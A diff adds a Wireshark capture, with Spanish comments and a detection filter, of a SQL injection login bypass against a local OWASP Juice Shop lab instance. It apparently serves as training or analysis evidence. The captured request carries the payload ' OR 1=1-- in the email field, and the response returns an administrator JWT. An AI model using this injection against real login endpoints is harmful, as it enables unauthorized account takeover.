@@ -1,0 +1,42 @@
+# Filtro de Wireshark que aísla el ataque:
+#   http.request.method == "POST" && http.request.uri contains "/rest/user/login" && http.file_data contains "OR 1=1"
+# Follow HTTP Stream del tcp.stream 3
+
+===================================================================
+Follow: http,ascii
+Filter: tcp.stream eq 3
+Node 0: 192.168.65.1:26141
+Node 1: 172.17.0.2:3000
+348
+POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: */*
+Accept-Encoding: deflate, gzip
+Content-Type: application/json
+Origin: http://localhost:3000
+Referer: http://localhost:3000/
+Content-Length: 49
+
+
+49
+{"email":"' OR 1=1--","password":"cualquiercosa"}
+	386
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Content-Length: 784
+ETag: W/"310-eQ4qqyyP/tRR9qN9tRYqRomoUQM"
+Vary: Accept-Encoding
+Date: Tue, 27 Oct 2026 21:12:32 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+
+	784
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTN9.F23e91osb-TzakVBahzE3nto2GkJgavBG8xpH3kRxCEgEb4Y0iNPWPx98datvc7GcE9PVRcVFtKjFMDfxdrYfmr6yNOaAuSx8qGoegBB1vKpTWhEjQLcLPo-IFRw0IGFwI1tWz535ZQRcnL5BunPbOQYywiN4zw53gvxzdbr88g","bid":1,"umail":"admin@juice-sh.op"}}
+===================================================================
